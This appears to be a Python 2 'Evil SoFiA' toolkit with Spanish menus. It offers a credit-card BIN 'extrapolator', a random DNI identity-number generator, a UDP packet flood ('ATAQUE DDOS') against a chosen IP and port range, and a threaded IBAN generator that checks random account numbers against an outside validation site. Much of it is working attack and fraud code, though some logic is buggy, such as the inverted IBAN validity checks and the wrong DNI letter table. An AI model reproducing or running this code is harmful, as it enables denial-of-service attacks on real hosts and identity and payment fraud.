#Evil SoFiA
import re
import time 
import sys
import os
import socket
import random
import requests
import string
import thread
from random import randint
from datetime import datetime
version = ' 1.9.1'
time.sleep(0.5)
execute = os.system

def correctRead(number, bin):
    read = 0
    while True:
        try:
            read = (input('  Introduce el dígito número ' + number + ' del ' + bin + ' Bin: '))
            if read >= 0 and read <= 9:
                break
            else:
                print('   Valor inválido')
        except Exception:
            print('   UN NUMERO')
    return read

def extrapolador():
    execute('title Extrapolador')
    execute('cls')
    execute('color 3')
    time.sleep(1.5)
    print("\tACCESS GRANTED!")
    time.sleep(1.5)
    print("")
    bin = (input("  Digite los primeros 8 digitos del Bin: "))
    lista = []
    lista.append(bin)
    # Primer Bin
    bin11 = correctRead('DIEZ', 'primer')
    bin12 = correctRead('ONCE', 'primer')
    # Segundo Bin
    bin21 = correctRead('DIEZ', 'segundo')
    bin22 = correctRead('ONCE', 'segundo')
    # Algoritmo
    a = int(bin11 + bin21 / 2) * 5
    b = int(bin12 + bin22 / 2) * 5
    c = a + b
    # Agregar los digitos
    lista.append(c)
    print("  Tu extrapolacion es: ")
    time.sleep(0.8)
    print("".join(repr(e) for e in lista))
    print("")
    time.sleep(2)
    raw_input("  Presiona Enter Para Salir De El Extrapolador")

def dniGenerator():
    #LAST DNI GEN
    execute("title LAST")
    execute("color 2")
    execute("cls")
    print time.strftime("               %I:%M:%S")
    print'''

    $$\        $$$$$$\   $$$$$$\ $$$$$$$$\ 
    $$ |      $$  __$$\ $$  __$$\\__$$  __|
    $$ |      $$ /  $$ |$$ /  \__|  $$ |   
    $$ |      $$$$$$$$ |\$$$$$$\    $$ |   
    $$ |      $$  __$$ | \____$$\   $$ |   
    $$ |      $$ |  $$ |$$\   $$ |  $$ |   
    $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |   
    \________|\__|  \__| \______/   \__|   


    '''
    dni=range(1,9)
    print("   Emmanuel Milos|Emilio Barroso|Joshua Salcido")
    i=0
    while i<len(dni):
        for element in dni:
           dni[i]=randint(1,9)
        i+=1
    dni2=''.join(map(str,dni))
    print ' '
    time.sleep(2)
    print ("          Generando DNI...")
    time.sleep(3)
    print '''
    '''
    numero = dni2
    intnumero = int(numero)
    letra1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    resto = intnumero%23
    letra = letra1[resto]
    print '   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%'
    print '   %        ' + numero,  "-", letra + '       %'
    print'   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%'
    print " "
    raw_input("  Presiona Enter Para Salir De El Generador")
    print("")

def ddos():
    execute("title DDOS")
    execute("color 6")
    execute("cls")
    now = datetime.now()
    hour = now.hour
    minute = now.minute
    day = now.day
    month = now.month
    year = now.year
    ##############
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    #############
    execute("cls")
    execute('color 5')
    print '''
    _  _  _  __    _ ______ _  __   
    | \| \/ \(_    |_| |  | |_|/  |/ 
    |_/|_/\_/__)   | | |  | | |\__|\ 
                                                          
    '''
    ip = raw_input("IP Target : ")
    port = input("Port       : ")
    execute("cls")
    execute("echo INICIANDO ATAQUE! ")
    print "[                    ] 0% "
    time.sleep(5)
    print "[=====               ] 25%"
    time.sleep(5)
    print "[==========          ] 50%"
    time.sleep(5)
    print "[===============     ] 75%"
    time.sleep(5)
    print "[====================] 100%"
    time.sleep(3)
    sent = 0
    while True:
         sock.sendto(bytes, (ip,port))
         sent = sent + 1
         port = port + 1
         print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
         if port == 65534:
            port = 1
            break

def iban():
    execute("title LAST")
    execute("color 8")
    execute("cls")
    logs1 = '''
     ___ ____    _    _   _        ____ _____ _   _ 
    |_ _| __ )  / \  | \ | |      / ___| ____| \ | |
    || ||  _ \ / _ \ |  \| |_____| |  _|  _| |  \| |
    || || |_) / ___ \| |\  |_____| |_| | |___| |\  |
    |___|____/_/   \_\_| \_|      \____|_____|_| \_|                                               
    \n[$] BOG IBAN GEN/VALIDATOR.
    [$] https://www.Bogpro.com/
    '''
    print logs1
    print '[X] ESCOGE EL PAIS [GERMANY[DE]/FRANCE[FR]/SPAIN[ES]/ITALIA[IT]].'
    print ''
    iban_co = raw_input('[X] ENTER YOUR IBAN COUNTRY NAME OR CODE X> ')
    if str(iban_co) == 'DE' or str(iban_co) == 'GERMANY':
        # //DE IBAN
        def de_chk(a, ab):
            de_iban = 'DE'+str(random.randint(00,99))+'50010517'+str(random.randint(0000000000,9999999999))
            chk_req = requests.post('https://check-iban.com/proxy.php?iban='+de_iban)
            if 'Diese IBAN ist nicht korrekt.' in chk_req.content:
                print '[-] INVALID GERMANY IBAN [ '+de_iban+' ].'
                pass
            elif 'Diese IBAN ist formal korrekt.' in chk_req.content:
                print '[+] VALID GERMANY IBAN [ '+de_iban+' ].'
                with open('VALID_DE.txt','a+') as f:
                    f.write('[+] VALID GERMANY IBAN [ '+de_iban+' ].')
                    f.close()
            else:
                print '[%] UNKNOWN GERMANY IBAN [ '+de_iban+' ].'
        while 1:
            thread.start_new_thread(de_chk, ('logs1', 10))
            time.sleep(0.25)

    elif str(iban_co) == 'FR' or str(iban_co) == 'FRANCE':
        # //FR IBAN
        def fr_chk(a, ab):
            fr_iban = 'FR'+str(random.randint(00,99))+'30066'+str(random.randint(000000000000000000,999999999999999999))
            chk_req = requests.post('https://check-iban.com/proxy.php?iban='+fr_iban)
            if 'This is a valid IBAN.' in chk_req.content:
                print '[-] INVALID FRANCE IBAN [ '+fr_iban+' ].'
                pass
            else:
                print '[+] VALID FRANCE IBAN [ '+fr_iban+' ].'
                with open('VALID_FR.txt','a+') as f:
                    f.write('[+] VALID FRANCE IBAN [ '+fr_iban+' ].')
                    f.close()
        while 1:
            thread.start_new_thread(fr_chk, ('logs1', 10))
            time.sleep(0.25)

    elif str(iban_co) == 'ES' or str(iban_co) == 'SPAIN':
        # //ES IBAN
        def es_chk(a, ab):
            es_iban = 'ES'+str(random.randint(0000000000000000000000,9999999999999999999999))
            chk_req = requests.post('https://check-iban.com/proxy.php?iban='+es_iban)
            if 'This is a valid IBAN.' in chk_req.content:
                print '[+] VALID SPAIN IBAN [ '+es_iban+' ].'
                with open('VALID_ES.txt','a+') as f:
                    f.write('[+] VALID SPAIN IBAN [ '+es_iban+' ].')
                    f.close()
            else:
                print '[-] INVALID SPAIN IBAN [ '+es_iban+' ].'
                pass
        while 1:
            thread.start_new_thread(es_chk, ('logs1', 10))
            time.sleep(0.25)

    elif str(iban_co) == 'IT' or str(iban_co) == 'ITALY':
        # //IT IBAN
        def it_chk(a, ab):
            it_iban = 'IT'+str(random.randint(00,99))+''.join(random.choice(string.ascii_uppercase) for _ in range(1))+'0300203280'+str(random.randint(000000000000,999999999999))
            chk_req = requests.post('https://check-iban.com/proxy.php?iban='+it_iban)
            if 'This is a valid IBAN.' in chk_req.content:
                print '[-] VALID ITALY IBAN [ '+it_iban+' ].'
                with open('VALID_IT.txt','a+') as f:
                    f.write('[+] VALID ITALY IBAN [ '+it_iban+' ].')
                    f.close()
            else:
                print '[+] INVALID ITALY IBAN [ '+it_iban+' ].'
                pass
        while 1:
            thread.start_new_thread(it_chk, ('logs1', 10))
            time.sleep(0.25)    
    else:
        # //OUT PUT
        print '[*]  PORFAVOR ESCRIBE UN PAIS O CODIGO DE PAIS VALIDO.'

def bye():
    print ("Gracias por Utlizar SoFiA")
    exit()

ols = time.strftime("%H:%M:%S")
print time.strftime("                     %I:%M:%S") 
if ols > "23:30":
    print "EVIL SOFIA SE ESTA ACTUALIZANDO!..."
    exit()
execute("color 4")
print '''
___ _   _  _ _      __   __  ___ _  __   
| __| \ / || | |   /' _/ /__\| __| |/  \  
| _|`\ V /'| | |_  `._`.| \/ | _|| | /\ | 
|___| \_/  |_|___| |___/ \__/|_| |_|_||_|  
'''
time.sleep(1.4)
execute("title EVIL SOFIA")
print "         Emmanuel Milos|Emilio Barroso|Joshua Salcido"
print "         ~EXTRAPOLADOR Y GENERADOR SOFIA~" 
print '''

'''

while True:
    execute("color 4")
    execute('cls')
    print("      .:MENU:.")
    print("   1.EXTRAPOLADOR")
    print("   2.GENERADOR DE DNI")
    print("   3.ATAQUE DDOS")
    print("   4.IBAN GEN/CHECK[BETA][INESTABLE]")
    print("   5.Salir")
    print("")
    option = input("  Digite el numero de la optionion: ")
    print("")
    switcher = {
        1: extrapolador,
        2: dniGenerator,
        3: ddos,
        4: iban,
        5: bye
    }
    func = switcher.get(option, exit)
    func()

